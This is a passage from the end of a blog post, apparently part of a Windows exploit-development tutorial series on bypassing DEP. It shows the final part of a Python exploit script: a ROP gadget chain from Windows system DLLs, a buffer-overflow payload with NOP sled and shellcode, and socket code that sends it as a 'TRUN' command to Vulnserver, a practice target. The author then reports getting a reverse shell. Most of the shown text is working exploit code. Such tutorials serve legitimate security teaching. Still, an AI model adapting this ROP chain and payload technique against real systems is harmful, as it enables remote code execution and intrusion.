</span></span><span class="line"><span class="cl">        <span class="mh">0x76963193</span><span class="p">,</span>  <span class="c1"># NEG EAX # RETN [user32.dll] ** REBASED ** ASLR                                                                                                                                                                                                                                                      </span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x74fa1110</span><span class="p">,</span>  <span class="c1"># XCHG EAX,EDX # RETN [KERNELBASE.dll] ** REBASED ** ASLR                                                                                                                                                                                                                                             </span>
</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                                                                                                           
</span></span><span class="line"><span class="cl">        <span class="c1">#[---INFO:gadgets_to_set_ecx:---]                                                                                                                                                                                                                                                                                  </span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x7689fb57</span><span class="p">,</span>  <span class="c1"># POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR                                                                                                                                                                                                                                                      </span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x75285e78</span><span class="p">,</span>  <span class="c1"># &amp;Writable location [MSCTF.dll] ** REBASED ** ASLR                                                                                                                                                                                                                                                   </span>
</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                                                                                                           
</span></span><span class="line"><span class="cl">        <span class="c1">#[---INFO:gadgets_to_set_edi:---]                                                                                                                                                                                                                                                                                  </span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x76df7643</span><span class="p">,</span>  <span class="c1"># POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR                                                                                                                                                                                                                                                       </span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x768a1645</span><span class="p">,</span>  <span class="c1"># RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR                                                                                                                                                                                                                                                      </span>
</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                                                                                                           
</span></span><span class="line"><span class="cl">        <span class="c1">#[---INFO:gadgets_to_set_eax:---]                                                                                                                                                                                                                                                                                  </span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x758b9b4c</span><span class="p">,</span>  <span class="c1"># POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR                                                                                                                                                                                                                                                    </span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x90909090</span><span class="p">,</span>  <span class="c1"># nop</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">#[---INFO:pushad:---]</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x758ec2a0</span><span class="p">,</span>  <span class="c1"># PUSHAD # RETN [kernel32.dll] ** REBASED ** ASLR</span>
</span></span><span class="line"><span class="cl">        <span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">_</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">rop_gadgets</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">rop_chain</span> <span class="o">=</span> <span class="n">create_rop_chain</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#JMP ESP 0x625011AF: \xAF\x11\x50\x62 (not required anymore)</span>
</span></span><span class="line"><span class="cl"><span class="n">memn0ps</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">2003</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">rop_chain</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">memn0ps</span> <span class="o">*</span> <span class="mi">20</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">memn0ps</span> <span class="o">*</span> <span class="mi">20</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">&#34;C&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">3000</span><span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">RHOST</span><span class="p">,</span> <span class="n">RPORT</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Sending exploit!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;TRUN /.:/&#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Evil buffer sent...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Could not connect to server!&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>W00TW00T we have a reverse shell. DEP was successfully bypassed! :D</p>
<p><img src="/Windows-User-Mode-Exploit-Development-DEP-Part-4/e344346141f940aa99c9fb4dec5ad6c8.png" alt="WOOTWOOT.png"></p>
<p>I hope you enjoyed reading and I hope this helps. This was a good revision for me, and I finally found the time to write up something quickly.</p>
<p>Usually, when I learn something like this, I go and write about it 1 or 2 years later for some good revisions and contribution back to the community. Even if it is small, it is better than nothing :)</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect</a></li>
<li><a href="https://fuzzysecurity.com/tutorials/expDev/7.html">https://fuzzysecurity.com/tutorials/expDev/7.html</a></li>
<li><a href="https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/">https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/</a></li>
<li><a href="https://h0mbre.github.io/Creating_Win32_ROP_Chains/#">https://h0mbre.github.io/Creating_Win32_ROP_Chains/#</a></li>
<li><a href="https://samsclass.info/127/proj/p11-rop.htm">https://samsclass.info/127/proj/p11-rop.htm</a></li>
<li><a href="https://sh3llc0d3r.com/">https://sh3llc0d3r.com/</a></li>
<li><a href="https://github.com/stephenbradshaw/vulnserver">https://github.com/stephenbradshaw/vulnserver</a></li>
<li><a href="https://cwinfosec.github.io/Intro-ROP-DEP-Bypass/">https://cwinfosec.github.io/Intro-ROP-DEP-Bypass/</a></li>
<li><a href="https://www.offensive-security.com/">https://www.offensive-security.com/</a></li>
</ul>


        

        

        
      </article>

      
        <ul class="pager blog-pager">
          
            <li class="previous">
              <a href="https://memn0ps.github.io/Windows-User-Mode-Exploit-Development-Egghunter-Part-3/" data-toggle="tooltip" data-placement="top" title="Windows User Mode Exploit Development: Egghunter Part 3">&larr; Previous Post</a>
            </li>
          
          
            <li class="next">
              <a href="https://memn0ps.github.io/HackTheBox-Pwn-Ropme/" data-toggle="tooltip" data-placement="top" title="HackTheBox Pwn: Ropme">Next Post &rarr;</a>
            </li>
          
        </ul>
      


      

    </div>
  </div>
</div>

      
<footer>
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center footer-links">
          
              <li>
                <a href="https://github.com/memN0ps" title="GitHub">
                  <span class="fa-stack fa-lg">
                    <i class="fas fa-circle fa-stack-2x"></i>
                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
              <li>
                <a href="https://twitter.com/memN0ps" title="Twitter">
                  <span class="fa-stack fa-lg">
                    <i class="fas fa-circle fa-stack-2x"></i>
                    <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
          
          <li>
            <a href="" title="RSS">
              <span class="fa-stack fa-lg">
                <i class="fas fa-circle fa-stack-2x"></i>
                <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
              </span>
            </a>
          </li>
          
        </ul>
        <p class="credits copyright text-muted">
          
            
              memN0ps
            
          

          &nbsp;&bull;&nbsp;&copy;
          
            2022
          

          
            &nbsp;&bull;&nbsp;
            <a href="https://memn0ps.github.io/">memN0ps</a>
          
        </p>
        
        <p class="credits theme-by text-muted">
          <a href="https://gohugo.io">Hugo v0.93.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
          
        </p>
      </div>
    </div>
  </div>
</footer><script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"></script>
<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>

<script src="https://memn0ps.github.io/js/main.js"></script><script> renderMathInElement(document.body); </script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://memn0ps.github.io/js/load-photoswipe.js"></script>









    
  </body>
</html>

